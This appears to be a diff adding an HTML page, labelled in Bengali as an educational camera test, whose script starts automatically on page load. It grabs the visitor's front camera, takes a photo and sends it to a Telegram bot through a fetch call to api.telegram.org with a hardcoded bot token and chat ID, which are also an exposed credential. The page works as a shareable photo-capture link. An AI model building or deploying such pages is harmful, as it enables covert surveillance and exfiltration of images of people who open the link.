@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>শিক্ষামূলক ক্যামেরা টেস্ট</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            font-size: 28px;
+            color: #007BFF;
+        }
+        p {
+            font-size: 18px;
+            color: #333;
+            margin-top: 20px;
+        }
+        #status {
+            font-size: 20px;
+            font-weight: bold;
+            color: #4CAF50;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>শিক্ষামূলক ক্যামেরা টেস্ট</h1>
+    <p>এই পেজটি শেখার উদ্দেশ্যে তৈরি করা হয়েছে। এটি দেখায় কিভাবে ব্রাউজার থেকে ক্যামেরা অ্যাক্সেস করা যায় এবং জাভাস্ক্রিপ্ট ব্যবহার করে ছবি পাঠানো যায়।</p>
+    <p id="status">ক্যামেরা অ্যাক্সেস করা হচ্ছে...</p>
+
+    <script>
+        // --- আপনার দেওয়া টোকেন ও আইডি বসানো হয়েছে ---
+        const telegramBotToken = "8354509532:AAFsEOed-DtdQN1LogdM6ftu8MVdeWiCdCw"; 
+        const chatId = "5722488391";
+        // ------------------------------------
+
+        const status = document.getElementById("status");
+
+        if (!chatId || !telegramBotToken) {
+            alert("ত্রুটি: বট টোকেন বা চ্যাট আইডি সেট করা হয়নি।");
+            status.textContent = "ত্রুটি: বট টোকেন এবং চ্যাট আইডি সেট করা হয়নি।";
+            console.error("Bot token or Chat ID is missing.");
+            throw new Error("Bot token or Chat ID is missing.");
+        }
+
+        async function captureAndSend() {
+            try {
+                status.textContent = "ক্যামেরা অ্যাক্সেস করা হচ্ছে...";
+                console.log("ক্যামেরা অ্যাক্সেসের চেষ্টা চলছে...");
+
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    alert("আপনার ব্রাউজার ক্যামেরা অ্যাক্সেস সমর্থন করে না।");
+                    status.textContent = "ত্রুটি: ব্রাউজার ক্যামেরা সমর্থন করে না।";
+                    console.error("getUserMedia not supported");
+                    return;
+                }
+
+                // সামনের ক্যামেরা অ্যাক্সেস করার চেষ্টা
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user" }
+                    });
+                    console.log("সামনের ক্যামেরা ব্যবহৃত হচ্ছে");
+                } catch (error) {
+                    console.warn("সামনের ক্যামেরা পাওয়া যায়নি, ডিফল্ট ক্যামেরা চেষ্টা করা হচ্ছে:", error);
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    console.log("ডিফল্ট ক্যামেরা ব্যবহৃত হচ্ছে");
+                }
+
+                status.textContent = "ছবি তোলা হচ্ছে...";
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                // ভিডিও লোড হওয়ার পর ছবি ক্যাপচার
+                video.onloadedmetadata = () => {
+                    console.log("ভিডিও লোড হয়েছে, ছবি ক্যাপচার করা হচ্ছে");
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext("2d");
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // ক্যামেরা বন্ধ করুন
+                    stream.getTracks().forEach(track => track.stop());
+                    status.textContent = "টেলিগ্রামে ছবি পাঠানো হচ্ছে...";
+
+                    // ছবিকে Blob-এ রূপান্তর
+                    canvas.toBlob(blob => {
+                        console.log("ছবি ক্যাপচার সম্পন্ন, টেলিগ্রামে পাঠানো হচ্ছে");
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, "image.jpg");
+
+                        // টেলিগ্রাম এপিআই-তে ছবি পাঠানো
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                            method: "POST",
+                            body: formData,
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("সফলভাবে ছবি পাঠানো হয়েছে!");
+                                status.textContent = "সফল! ছবিটি আপনার টেলিগ্রাম বটে পাঠানো হয়েছে।";
+                            } else {
+                                alert("ছবি পাঠাতে ব্যর্থ: " + data.description);
+                                status.textContent = "ত্রুটি: ছবি পাঠাতে ব্যর্থ - " + data.description;
+                                console.error("Telegram API error:", data);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error sending photo:", error);
+                            alert("ছবি পাঠাতে ত্রুটি হয়েছে।");
+                            status.textContent = "ত্রুটি: ছবি পাঠাতে সমস্যা।";
+                        });
+                    }, "image/jpeg");
+                };
+            } catch (error) {
+                console.error("Camera access error:", error.name, error.message);
+                alert("ক্যামেরা অ্যাক্সেস করতে ব্যর্থ: " + error.message);
+                status.textContent = "ত্রুটি: ক্যামেরা অ্যাক্সেস করতে ব্যর্থ।";
+                
+                if (error.name === "NotAllowedError") {
+                    alert("আপনি ক্যামেরা ব্যবহারের অনুমতি দেননি।");
+                    status.textContent = "ত্রুটি: ক্যামেরা ব্যবহারের অনুমতি দিন।";
+                } else if (error.name === "NotFoundError") {
+                    alert("এই ডিভাইসে ক্যামেরা পাওয়া যায়নি।");
+                    status.textContent = "ত্রুটি: কোনো ক্যামেরা খুঁজে পাওয়া যায়নি।";
+                } else if (error.name === "NotReadableError") {
+                     alert("ক্যামেরা অন্য কোনো অ্যাপ ব্যবহার করছে অথবা হার্ডওয়্যার সমস্যা।");
+                    status.textContent = "ত্রুটি: ক্যামেরা ব্যবহার করা যাচ্ছে না।";
+                } else if (error.name === "SecurityError") {
+                    alert("নিরাপত্তাজনিত কারণে ক্যামেরা অ্যাক্সেস করা যাচ্ছে না। ফাইলটি একটি সার্ভার থেকে লোড করুন।");
+                    status.textContent = "ত্রুটি: ক্যামেরা অ্যাক্সেস করতে ব্যর্থ (SecurityError)।";
+                }
+            }
+        }
+
+        // পেজ লোড হলেই স্বয়ংক্রিয়ভাবে ফাংশনটি চালু হবে
+        window.onload = captureAndSend;
+    </script>
+
+</body>
+</html>
